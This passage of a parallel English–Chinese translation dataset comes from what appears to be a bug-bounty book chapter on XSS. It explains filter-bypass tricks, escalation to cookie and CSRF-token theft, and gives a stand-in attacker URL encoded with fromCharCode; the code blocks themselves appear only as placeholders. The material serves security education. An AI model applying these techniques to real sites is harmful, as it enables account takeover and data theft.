  - PREF_H3
  type: TYPE_NORMAL
  zh: 步骤3：确认影响
- en: Check for your payload on the destination page. If you’re using an alert function,
    was a pop-up box generated on the page? If you’re using a `location` payload,
    did your browser redirect you offsite?
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 在目标页面检查您的有效载荷。如果您使用的是alert函数，页面上是否生成了弹出框？如果您使用的是`location`有效载荷，浏览器是否将您重定向到外部网站？
- en: Be aware that sites might also use user input to construct something other than
    the next returned web page. Your input could show up in future web pages, email,
    and file portals. A time delay also might occur between when the payload is submitted
    and when the user input is rendered. This situation is common in log files and
    analytics pages. If you’re targeting these, your payload might not execute until
    later, or in another user’s account. And certain XSS payloads will execute under
    only certain contexts, such as when an admin is logged in or when the user actively
    clicks, or hovers over, certain HTML elements. Confirm the impact of the XSS payload
    by browsing to the necessary pages and performing those actions.
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，网站也可能使用用户输入构建除下一个返回的网页之外的内容。您的输入可能会出现在未来的网页、电子邮件或文件门户中。提交有效载荷和用户输入呈现之间也可能会有时间延迟。这种情况在日志文件和分析页面中很常见。如果您正在针对这些页面，您的有效载荷可能直到稍后或在另一个用户账户下执行。而某些XSS有效载荷只有在特定上下文中才能执行，比如当管理员登录时，或者当用户主动点击或悬停在某些HTML元素上时。通过浏览必要的页面并执行这些操作来确认XSS有效载荷的影响。
- en: Bypassing XSS Protection
  id: totrans-166
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 绕过XSS保护
- en: Most applications now implement some sort of XSS protection in their input fields.
    Often, they’ll use a blocklist to filter out dangerous expressions that might
    be indicative of XSS. Here are some strategies for bypassing this type of protection.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数应用程序现在在其输入字段中实现了一些XSS防护。通常，它们会使用黑名单来过滤掉可能表明XSS的危险表达式。以下是绕过这种类型保护的一些策略。
- en: Alternative JavaScript Syntax
  id: totrans-168
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 替代的JavaScript语法
- en: 'Often, applications will sanitize `<script>` tags in user input. If that is
    the case, try executing XSS that doesn’t use a `<script>` tag. For example, remember
    that in certain scenarios, you can specify JavaScript to run in other types of
    tags. When you try to construct an XSS payload, you can also try to insert code
    into HTML tag names or attributes instead. Say user input is passed into an HTML
    image tag, like this:'
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，应用程序会对用户输入中的`<script>`标签进行消毒。如果是这种情况，尝试执行不使用`<script>`标签的XSS。例如，请记住，在某些情况下，您可以指定JavaScript在其他类型的标签中运行。当您尝试构造XSS有效载荷时，您还可以尝试将代码插入到HTML标签名称或属性中。假设用户输入被传递到HTML图像标签中，如下所示：
- en: '[PRE32]'
  id: totrans-170
  prefs: []
  type: TYPE_PRE
  zh: '[PRE32]'
- en: Instead of closing out the image tag and inserting a script tag, like this
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 与其关闭图片标签并插入脚本标签，像这样
- en: '[PRE33]'
  id: totrans-172
  prefs: []
  type: TYPE_PRE
  zh: '[PRE33]'
- en: 'you can insert the JavaScript code directly as an attribute to the current
    tag:'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以将JavaScript代码直接作为属性插入到当前标签中：
- en: '[PRE34]'
  id: totrans-174
  prefs: []
  type: TYPE_PRE
  zh: '[PRE34]'
- en: 'Another way of injecting code without the `<script>` tag is to use the special
    URL schemes mentioned before. This snippet will create a Click me! link that will
    generate an alert box when clicked:'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 另一种不使用`<script>`标签注入代码的方法是使用前面提到的特殊URL方案。此代码片段将创建一个点击我！的链接，点击后将生成一个弹出框：
- en: '[PRE35]'
  id: totrans-176
  prefs: []
  type: TYPE_PRE
  zh: '[PRE35]'
- en: Capitalization and Encoding
  id: totrans-177
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 大小写和编码
- en: 'You can also mix different encodings and capitalizations to confuse the XSS
    filter. For example, if the filter filters for only the string `"script"`, capitalize
    certain letters in your payload. Since browsers often parse HTML code permissively
    and will allow for minor syntax issues like capitalization, this won’t affect
    how the script tag is interpreted:'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 你还可以混合不同的编码和大小写来迷惑XSS过滤器。例如，如果过滤器只过滤字符串`"script"`，你可以将有效负载中的某些字母大写。由于浏览器通常会宽松解析HTML代码，并允许像大小写这种小的语法问题，这不会影响`<script>`标签的解析：
- en: '[PRE36]'
  id: totrans-179
  prefs: []
  type: TYPE_PRE
  zh: '[PRE36]'
- en: 'If the application filters special HTML characters, like single and double
    quotes, you can’t write any strings into your XSS payload directly. But you could
    try using the JavaScript `fromCharCode()` function, which maps numeric codes to
    the corresponding ASCII characters, to create the string you need. For example,
    this piece of code is equivalent to the string `"http://attacker_server_ip/?c="`:'
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 如果应用程序过滤了特殊的HTML字符，如单引号和双引号，你就不能直接将任何字符串写入XSS有效负载。但你可以尝试使用JavaScript的`fromCharCode()`函数，该函数将数字代码映射到相应的ASCII字符，从而创建你需要的字符串。例如，这段代码等同于字符串`"http://attacker_server_ip/?c="`：
- en: '[PRE37]'
  id: totrans-181
  prefs: []
  type: TYPE_PRE
  zh: '[PRE37]'
- en: 'This means you can construct an XSS payload without quotes, like this:'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 这意味着你可以构造没有引号的XSS有效负载，像这样：
- en: '[PRE38]'
  id: totrans-183
  prefs: []
  type: TYPE_PRE
  zh: '[PRE38]'
- en: 'The `String.fromCharCode()` function returns a string, given an input list
    of ASCII character codes. You can use this piece of code to translate your exploit
    string to an ASCII number sequence by using an online JavaScript editor, like
    *https://js.do/*, to run the JavaScript code or by saving it into an HTML file
    and loading it in your browser:'
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: '`String.fromCharCode()`函数接受一组ASCII字符代码作为输入，返回一个字符串。你可以使用这段代码通过使用在线JavaScript编辑器，如*https://js.do/*，来运行JavaScript代码，或者将其保存为HTML文件并在浏览器中加载，从而将你的漏洞字符串转换为ASCII数字序列：'
- en: '[PRE39]'
  id: totrans-185
  prefs: []
  type: TYPE_PRE
  zh: '[PRE39]'
- en: 'The `ascii()` function 1 converts characters to their ASCII numeric representation.
    We run each character in the input string through `ascii()` 2. Finally, we write
    the translated string to the document 3. Let’s translate the payload `http://attacker_server_ip/?c=`
    by using this code:'
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: '`ascii()`函数1将字符转换为其ASCII数值表示。我们将输入字符串中的每个字符都通过`ascii()`2。最后，我们将翻译后的字符串写入文档3。让我们通过这段代码使用`http://attacker_server_ip/?c=`来翻译这个有效负载：'
- en: '[PRE40]'
  id: totrans-187
  prefs: []
  type: TYPE_PRE
  zh: '[PRE40]'
- en: This JavaScript code should print out `"104, 116, 116, 112, 58, 47, 47, 97,
    116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112,
    47, 63, 99, 61"`. You can then use it to construct your payload by using the `fromCharCode()`
    method.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 这段JavaScript代码应该输出`"104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107,
    101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61"`。你可以通过使用`fromCharCode()`方法来构造你的有效负载。
- en: Filter Logic Errors
  id: totrans-189
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 过滤器逻辑错误
- en: 'Finally, you could exploit any errors in the filter logic. For example, sometimes
    applications remove all `<script>` tags in the user input to prevent XSS, but
    do it only once. If that’s the case, you can use a payload like this:'
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，你可以利用过滤器逻辑中的任何错误。例如，有时应用程序会移除用户输入中的所有`<script>`标签以防止XSS，但只执行一次。如果是这种情况，你可以使用像这样的有效负载：
- en: '[PRE41]'
  id: totrans-191
  prefs: []
  type: TYPE_PRE
  zh: '[PRE41]'
- en: 'Notice that each `<script>` tag cuts another `<script>` tag in two. The filter
    won’t recognize those broken tags as legitimate, but once the filter removes the
    intact tags from this payload, the rendered input becomes a perfectly valid piece
    of JavaScript code:'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，每个`<script>`标签会将另一个`<script>`标签分割成两个。过滤器不会识别这些破损的标签为合法标签，但一旦过滤器从此有效负载中移除完整的标签，渲染后的输入就会变成一段完全有效的JavaScript代码：
- en: '[PRE42]'
  id: totrans-193
  prefs: []
  type: TYPE_PRE
  zh: '[PRE42]'
- en: These are just a handful of the filter-bypass techniques that you can try. XSS
    protection is difficult to do right, and hackers are constantly coming up with
    new techniques to bypass protection. That’s why hackers are still constantly finding
    and exploiting XSS issues in the wild. For more filter-bypass ideas, check out
    OWASP’s XSS filter evasion cheat sheet ([https://owasp.org/www-community/xss-filter-evasion-cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)).
    You can also simply Google for *XSS filter bypass* for more interesting articles.
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 这些只是你可以尝试的几种过滤器绕过技术。XSS防护很难做到完全正确，黑客们不断发明新的技术来绕过防护。这就是为什么黑客们仍然在不断发现并利用XSS漏洞。欲了解更多绕过过滤器的点子，请查看OWASP的XSS过滤器规避备忘单（[https://owasp.org/www-community/xss-filter-evasion-cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)）。你还可以通过Google搜索*XSS
    filter bypass*来阅读更多有趣的文章。
- en: Escalating the Attack
  id: totrans-195
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 升级攻击
- en: The impact of XSS varies because of several factors. For instance, the type
    of XSS determines the number of users who could be affected. Stored XSS on a public
    forum can realistically attack anyone who visits that forum page, so stored XSS
    is considered the most severe. On the other hand, reflected or DOM XSS can affect
    only users who click the malicious link, and self-XSS requires a lot of user interaction
    and social engineering to execute, so they are normally considered lower impact.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: XSS 的影响因多个因素而异。例如，XSS 的类型决定了可能受影响的用户数量。存储型 XSS 在公共论坛上可能攻击任何访问该论坛页面的用户，因此存储型
    XSS 被认为是最严重的。另一方面，反射型 XSS 或 DOM XSS 只会影响点击恶意链接的用户，而自我 XSS 需要大量的用户交互和社会工程学手段才能执行，因此通常被认为是低影响。
- en: The identities of the affected users matter too. Let’s say a stored XSS vulnerability
    is on a site’s server logs. The XSS can affect system administrators and allow
    attackers to take over their sessions. Since the affected users are accounts of
    high privilege, the XSS can compromise the integrity of the entire application.
    You might gain access to customer data, internal files, and API keys. You might
    even escalate the attack into RCE by uploading a shell or execute scripts as the
    admin.
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 受影响用户的身份也很重要。假设一个存储型 XSS 漏洞存在于某个站点的服务器日志中。这个 XSS 可以影响系统管理员，并允许攻击者接管他们的会话。由于受影响的用户是具有高权限的账户，XSS
    漏洞可能危及整个应用的完整性。你可能会获得对客户数据、内部文件和 API 密钥的访问权限，甚至可能通过上传 shell 或以管理员身份执行脚本，将攻击升级为远程代码执行（RCE）。
- en: If, instead, the affected population is the general user base, XSS allows attackers
    to steal private data like cookies and session tokens. This can allow attackers
    to hijack any user’s session and take over the associated account.
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 如果受影响的是普通用户群体，XSS 允许攻击者窃取私人数据，如 cookies 和会话令牌。这可以使攻击者劫持任何用户的会话并接管关联的账户。
- en: Most of the time, XSS can be used to read sensitive information on the victim’s
    page. Since scripts executed during an XSS attack run as the target page, the
    script is able to access any information on that page. This means that you can
    use XSS to steal data and escalate your attack from there. This can be done by
    running a script that sends the data back to you. For example, this code snippet
    reads the CSRF token embedded on the victim’s page and sends it to the attacker’s
    server as a URL parameter named `token`. If you can steal a user’s CSRF tokens,
    you can execute actions on their behalf by using those tokens to bypass CSRF protection
    on the site. (See Chapter 9 for more on CSRF.)
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数情况下，XSS 可以用来读取受害者页面上的敏感信息。由于 XSS 攻击期间执行的脚本与目标页面一起运行，该脚本能够访问该页面上的任何信息。这意味着你可以利用
    XSS 窃取数据并从中升级你的攻击。你可以通过运行一个将数据发送回攻击者服务器的脚本来实现这一点。例如，这段代码片段读取受害者页面中嵌入的 CSRF 令牌，并将其作为
    URL 参数 `token` 发送到攻击者的服务器。如果你能窃取用户的 CSRF 令牌，你就可以利用这些令牌在用户不知情的情况下执行操作，从而绕过网站的 CSRF
    保护。（更多关于 CSRF 的内容，请参见第 9 章。）
- en: '[PRE43]'
  id: totrans-200
  prefs: []
  type: TYPE_PRE
  zh: '[PRE43]'
- en: XSS can also be used to dynamically alter the page the victim sees, so you can
    replace the page with a fake login page and trick the user into giving you their
    credentials (often called *phishing*). XSS can also allow attackers to automatically
    redirect the victim to malicious pages and perform other harmful operations while
    posing as the legit site, such as installing malware. Before reporting the XSS
    you found, make sure to assess the full impact of that particular XSS to include
    in your vulnerability report.
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: XSS 还可以用来动态更改受害者看到的页面，因此你可以用假登录页面替换原页面，诱使用户提供他们的凭证（通常称为 *钓鱼*）。XSS 还允许攻击者自动将受害者重定向到恶意页面，并在伪装成合法站点的同时执行其他有害操作，如安装恶意软件。在报告你发现的
    XSS 漏洞之前，务必评估该 XSS 的全部影响，以便在漏洞报告中包含相关信息。
- en: Automating XSS Hunting
  id: totrans-202
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 自动化 XSS 攻击检测
- en: XSS hunting can be time-consuming. You might spend hours inspecting different
    request parameters and never find any XSS. Fortunately, you can use tools to make
    your work more efficient.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: XSS 攻击检测可能会非常耗时。你可能花费几个小时检查不同的请求参数，却始终找不到任何 XSS 漏洞。幸运的是，你可以使用工具提高工作效率。
- en: First, you can use browser developer tools to look for syntax errors and troubleshoot
    your payloads. I also like to use my proxy’s search tool to search server responses
    for reflected input. Finally, if the program you are targeting allows automatic
    testing, you can use Burp intruder or other fuzzers to conduct an automatic XSS
    scan on your target. We will talk about this in Chapter 25.
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，你可以使用浏览器开发者工具查找语法错误并排查你的有效载荷问题。我还喜欢使用我的代理搜索工具来搜索服务器响应中的反射输入。最后，如果你正在攻击的程序允许自动化测试，你可以使用Burp
    Intruder或其他模糊测试工具在目标上进行自动XSS扫描。我们将在第25章讨论这一点。
- en: Finding Your First XSS!
  id: totrans-205
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 寻找你的第一个XSS漏洞！
- en: 'Jump right into hunting for your first XSS! Choose a target and follow the
    steps we covered in this chapter:'
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 直接开始寻找你的第一个XSS漏洞！选择一个目标并按照本章中介绍的步骤操作：
- en: Look for user input opportunities on the application. When user input is stored
    and used to construct a web page later, test the input field for stored XSS. If
    user input in a URL gets reflected back on the resulting web page, test for reflected
    and DOM XSS.
  id: totrans-207
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在应用程序中寻找用户输入的机会。当用户输入被存储并用于构建网页时，测试输入字段是否存在存储型XSS漏洞。如果用户输入在URL中被反射到最终的网页上，测试是否存在反射型和DOM
    XSS漏洞。
- en: Insert XSS payloads into the user input fields you’ve found. Insert payloads
    from lists online, a polyglot payload, or a generic test string.
  id: totrans-208
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将XSS有效载荷插入到你找到的用户输入字段中。可以插入来自网络上的有效载荷列表、一个多语言有效载荷，或者一个通用测试字符串。
- en: Confirm the impact of the payload by checking whether your browser runs your
    JavaScript code. Or in the case of a blind XSS, see if you can make the victim
    browser generate a request to your server.
  id: totrans-209
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过检查浏览器是否执行了你的JavaScript代码来确认有效载荷的影响。或者，在盲XSS的情况下，看看你是否能让受害者的浏览器生成一个请求到你的服务器。
- en: If you can’t get any payloads to execute, try bypassing XSS protections.
  id: totrans-210
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果你无法执行任何有效载荷，尝试绕过XSS防护。
- en: Automate the XSS hunting process with techniques introduced in Chapter 25.
  id: totrans-211
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用第25章中介绍的技术来自动化XSS漏洞的寻找过程。
- en: 'Consider the impact of the XSS you’ve found: who does it target? How many users
    can it affect? And what can you achieve with it? Can you escalate the attack by
    using what you’ve found?'
  id: totrans-212
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 考虑你发现的XSS漏洞的影响：它针对谁？它能影响多少用户？你可以通过它达到什么目的？你能利用所发现的漏洞进行攻击升级吗？
- en: Send your first XSS report to a bug bounty program!
  id: totrans-213
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将你的第一个XSS漏洞报告提交给漏洞奖励计划！
